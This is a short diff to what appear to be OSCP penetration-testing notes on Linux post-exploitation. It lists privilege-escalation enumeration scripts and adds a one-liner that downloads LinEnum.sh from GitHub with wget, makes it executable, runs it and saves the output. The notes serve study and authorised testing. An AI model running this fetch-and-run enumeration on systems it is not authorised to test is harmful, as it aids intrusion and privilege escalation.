@@ -33,3 +33,11 @@
 - Linenum.sh
 - linuxprivchecker.py
 - unix-priv-checker.sh
+
+#### Stupid one liners
+
+- Automate LinEnum.sh: download > chmod > run > output to file
+
+```
+wget https://raw.githubusercontent.com/Arken2/Everything-OSCP/master/Linux%20Post%20exploitation/LinEnum.sh ; chmod +x LinEnum.sh ; ./LinEnum.sh > LinEnum-Output.txt
+```
